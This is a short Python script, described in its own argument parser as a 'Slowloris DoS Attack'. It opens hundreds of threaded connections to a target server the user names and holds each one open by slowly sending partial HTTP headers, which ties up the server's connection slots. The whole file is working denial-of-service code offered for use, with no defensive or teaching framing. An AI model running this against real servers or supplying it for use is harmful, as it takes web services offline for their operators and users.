import socket
import threading
import time
import argparse

# Function to send partial HTTP requests
def slowloris_attack(target, port, interval):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode("utf-8"))

        while True:
            time.sleep(interval)
            s.send("X-a: keep-alive\r\n".encode("utf-8"))  # Sending partial headers
    except socket.error:
        pass

# Argument Parser for User Input
parser = argparse.ArgumentParser(description="Slowloris DoS Attack")
parser.add_argument("target", help="Target server IP or domain")
parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
parser.add_argument("-c", "--connections", type=int, default=500, help="Number of connections")
parser.add_argument("-i", "--interval", type=int, default=15, help="Interval between partial requests")
args = parser.parse_args()

# Launch multiple attack threads
print(f"Launching {args.connections} connections to {args.target} on port {args.port}...")

for _ in range(args.connections):
    thread = threading.Thread(target=slowloris_attack, args=(args.target, args.port, args.interval))
    thread.start()
